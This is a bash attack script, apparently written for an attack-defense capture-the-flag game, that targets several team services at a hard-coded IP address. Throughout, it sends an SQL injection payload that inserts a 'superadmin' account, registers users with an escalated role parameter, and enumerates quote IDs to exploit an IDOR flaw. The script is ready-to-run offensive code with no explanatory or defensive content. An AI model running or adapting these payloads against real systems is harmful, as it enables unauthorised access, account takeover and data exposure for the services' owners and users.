#!/bin/bash

echo "🚀 Starting attacks on other teams..."

# Target team instances
TEAMS=("9001" "9003" "9004" "9005")
BASE_URL="http://54.69.37.82"

for port in "${TEAMS[@]}"; do
    echo ""
    echo "=================================================="
    echo "Attacking Team on port $port"
    echo "=================================================="
    
    target_url="$BASE_URL:$port"
    
    # Attack 1: SQL Injection via user registration
    echo "[*] Attempting SQL injection attack..."
    curl -s -X POST "$target_url/register" \
        -d "username=hacker'; INSERT INTO users (username, password_hash, user_type) VALUES ('pwned', '\$2b\$12\$dummy', 'superadmin'); --" \
        -d "password=password123" \
        -d "confirm_password=password123" \
        -d "role=normal" \
        -o /dev/null
    echo "[+] SQL injection payload sent to $target_url"
    
    # Attack 2: Privilege escalation via role parameter
    echo "[*] Attempting privilege escalation..."
    curl -s -X POST "$target_url/register" \
        -d "username=evil_admin_$(date +%s)" \
        -d "password=password123" \
        -d "confirm_password=password123" \
        -d "role=superadmin" \
        -o /dev/null
    echo "[+] Privilege escalation attempt sent to $target_url"
    
    # Attack 3: IDOR - Try to access other users' quotes
    echo "[*] Testing IDOR vulnerability..."
    for quote_id in {1..5}; do
        response=$(curl -s -w "%{http_code}" "$target_url/quote/$quote_id" -o /dev/null)
        if [ "$response" = "200" ]; then
            echo "[+] IDOR successful: Accessed quote $quote_id on $target_url"
        fi
    done
    
    echo "[*] Attack round completed for $target_url"
done

echo ""
echo "🎯 Attack summary complete!"
echo "Check the scoreboard to see if you captured any flags!"
